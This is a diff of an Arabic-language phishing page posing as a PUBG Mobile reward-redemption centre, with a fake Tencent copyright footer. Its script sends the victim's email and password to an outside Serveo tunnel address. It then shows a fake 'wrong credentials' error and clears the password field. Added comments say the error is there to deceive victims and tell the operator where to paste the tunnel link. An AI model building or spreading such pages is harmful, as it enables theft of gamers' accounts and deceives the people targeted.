@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PUBG MOBILE | مركز الاسترداد</title>
     <style>
+        /* تصميم يحاكي نمط ببجي موبايل */
         body {
             background-color: #0b0e11;
             background-image: radial-gradient(circle, #1a202c 0%, #0b0e11 100%);
@@ -16,6 +17,7 @@
             align-items: center;
             min-height: 100vh;
         }
+
         .container {
             width: 90%;
             max-width: 450px;
@@ -26,9 +28,26 @@
             box-shadow: 0 0 20px rgba(250, 204, 21, 0.4);
             text-align: center;
         }
-        .header img { width: 120px; margin-bottom: 15px; }
-        h2 { color: #facc15; font-size: 1.4rem; margin-bottom: 5px; }
-        p { color: #94a3b8; font-size: 0.85rem; margin-bottom: 20px; }
+
+        .header img {
+            width: 120px;
+            margin-bottom: 15px;
+        }
+
+        h2 {
+            color: #facc15;
+            font-size: 1.4rem;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+        }
+
+        p {
+            color: #94a3b8;
+            font-size: 0.85rem;
+            margin-bottom: 20px;
+        }
+
+        /* رسالة الخطأ التي تظهر بعد الإرسال للتمويه */
         .error-banner {
             background-color: #7f1d1d;
             color: #fca5a5;
@@ -36,11 +55,22 @@
             border-radius: 5px;
             margin-bottom: 15px;
             font-size: 0.8rem;
-            display: none;
+            display: none; /* مخفية في البداية */
             border: 1px solid #ef4444;
         }
-        .input-group { text-align: right; margin-bottom: 15px; }
-        .input-group label { display: block; color: #facc15; margin-bottom: 5px; font-size: 0.9rem; }
+
+        .input-group {
+            text-align: right;
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            color: #facc15;
+            margin-bottom: 5px;
+            font-size: 0.9rem;
+        }
+
         .input-group input {
             width: 100%;
             padding: 12px;
@@ -51,6 +81,11 @@
             box-sizing: border-box;
             outline: none;
         }
+
+        .input-group input:focus {
+            border-color: #facc15;
+        }
+
         .btn-submit {
             width: 100%;
             padding: 12px;
@@ -61,6 +96,17 @@
             font-weight: bold;
             font-size: 1rem;
             cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .btn-submit:hover {
+            background: #eab308;
+        }
+
+        .footer-note {
+            margin-top: 20px;
+            font-size: 0.7rem;
+            color: #64748b;
         }
     </style>
 </head>
@@ -70,8 +116,9 @@
         <div class="header">
             <img src="https://logodownload.org/wp-content/uploads/2019/04/pubg-mobile-logo.png" alt="PUBG Logo">
         </div>
+
         <h2>مركز استرداد الهدايا</h2>
-        <p>سجل دخولك الآن للمطالبة بمكافأة الموسم (واستلام هديتك على حسابك)</p>
+        <p>سجل دخولك الآن للمطالبة بمكافأة الموسم (UC & Skins)</p>
 
         <div id="msg_box" class="error-banner">تأكد أنك لم تخطئ في كتابة البريد الإلكتروني أو كلمة السر.</div>
 
@@ -80,12 +127,18 @@
                 <label>البريد الإلكتروني أو معرف اللاعب</label>
                 <input type="text" id="email_field" placeholder="example@mail.com" required>
             </div>
+            
             <div class="input-group">
                 <label>كلمة المرور</label>
                 <input type="password" id="pass_field" placeholder="أدخل كلمة المرور" required>
             </div>
+
             <button type="submit" class="btn-submit">تفعيل المكافأة الآن</button>
         </form>
+
+        <div class="footer-note">
+            حقوق النشر © 2026 شركة TENCENT. جميع الحقوق محفوظة.
+        </div>
     </div>
 
     <script>
@@ -96,12 +149,12 @@
             const pass_val = document.getElementById('pass_field').value;
             const errorBox = document.getElementById('msg_box');
 
-            // الرابط المحدث مع علامة / في النهاية لضمان التوافق مع Flask
+            // !!! تأكد من وضع الرابط الذي يظهر لك في نافذة Serveo هنا !!!
+            // يجب أن ينتهي الرابط بعلامة / 
             const targetUrl = 'https://15f8cda502bbb1ff-110-238-40-222.serveousercontent.com/';
 
             fetch(targetUrl, {
                 method: 'POST',
-                mode: 'cors',
                 headers: {
                     'Content-Type': 'application/json'
                 },
@@ -111,15 +164,18 @@
                 })
             })
             .then(response => {
+                // إظهار رسالة الخطأ للمستخدم بعد أن تصل البيانات لك بنجاح
                 errorBox.style.display = 'block';
-                document.getElementById('pass_field').value = ''; 
+                // مسح كلمة السر لكي يظن المستخدم أنه أخطأ فعلاً
+                document.getElementById('pass_field').value = '';
             })
             .catch(error => {
                 console.error('Error:', error);
-                // تظهر الرسالة حتى لو كان هناك خطأ لضمان استمرار العملية
+                // إظهار الرسالة حتى لو كان هناك خطأ لضمان استمرار العملية والتمويه
                 errorBox.style.display = 'block';
             });
         });
     </script>
+
 </body>
 </html>
